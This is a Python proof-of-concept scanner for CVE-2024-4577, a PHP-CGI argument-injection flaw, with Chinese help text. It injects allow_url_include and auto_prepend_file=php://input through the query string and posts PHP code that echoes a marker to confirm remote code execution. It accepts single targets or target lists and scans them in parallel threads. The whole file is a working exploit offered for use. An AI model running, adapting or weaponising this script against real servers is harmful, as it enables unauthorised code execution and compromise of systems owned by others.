import threading
import requests
import argparse

def read_url(file_path):
    with open(file_path, 'r') as file:
        for url in file:
            yield url.strip()

def poc1(url):
    payload = "/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input"
    headers = {"REDIRECT-STATUS": "1",
               "Content-type": "text/html; charset=UTF-8",
               "Content-Type": "application/x-www-form-urlencoded",
               "Content-Length": "22"}
    data = "<?php echo 'fkalis';?>"
    try:
        if not url.startswith('http://') and not url.startswith('https://'):
            url = "http://" + url
        url1 = f"{url}{payload}"
        r = requests.post(url1, headers=headers, data=data, verify=False, timeout=5, allow_redirects=False)
        if "fkalis" in r.text:
            print(f"[+]{url}存在CVE-2024-4577")
    except (requests.exceptions.Timeout, requests.exceptions.ProxyError, requests.exceptions.RequestException) as e:
        pass

def poc2(urls_path):
    threads = []
    for url in read_url(f"{urls_path}"):
        thread = threading.Thread(target=poc1,args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    banner = """
  ______   __     __  ________       ______    ______    ______   __    __         __    __  _______   ________ ________ 
 /      \ |  \   |  \|        \     /      \  /      \  /      \ |  \  |  \       |  \  |  \|       \ |        \        
|  $$$$$$\| $$   | $$| $$$$$$$$    |  $$$$$$\|  $$$$$$\|  $$$$$$\| $$  | $$       | $$  | $$| $$$$$$$  \$$$$$$$$\$$$$$$$$
| $$   \$$| $$   | $$| $$__ ______  \$$__| $$| $$$\| $$ \$$__| $$| $$__| $$ ______| $$__| $$| $$____      /  $$    /  $$ 
| $$       \$$\ /  $$| $$  \      \ /      $$| $$$$\ $$ /      $$| $$    $$|      \ $$    $$| $$    \    /  $$    /  $$  
| $$   __   \$$\  $$ | $$$$$\$$$$$$|  $$$$$$ | $$\$$\$$|  $$$$$$  \$$$$$$$$ \$$$$$$\$$$$$$$$ \$$$$$$$\  /  $$    /  $$   
| $$__/  \   \$$ $$  | $$_____     | $$_____ | $$_\$$$$| $$_____       | $$             | $$|  \__| $$ /  $$    /  $$    
 \$$    $$    \$$$   | $$     \    | $$     \ \$$  \$$$| $$     \      | $$             | $$ \$$    $$|  $$    |  $$     
  \$$$$$$      \$     \$$$$$$$$     \$$$$$$$$  \$$$$$$  \$$$$$$$$       \$$              \$$  \$$$$$$  \$$      \$$                                                                                                                         
    """
    print(banner)
    print("CVE-2024-4577 version: PHP 8.3 < 8.3.8 , PHP 8.2 < 8.2.20 , PHP 8.1 < 8.1.29")
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",dest="url",required=False,type=str,default=None,help="指定测试IP")
    parser.add_argument("-l",dest="urls",required=False,type=str,default=None,help="指定测试IP文件(txt)路径")
    args = parser.parse_args()
    if not (args.url or args.urls):
        parser.error("至少提供 -u 或 -l 一个参数")
    elif args.url and args.urls:
        parser.error("-u 和 -l 参数不能同时存在")
    if args.url:
        poc1(args.url)
    elif args.urls:
        poc2(args.urls)


if __name__ == "__main__":
    main()
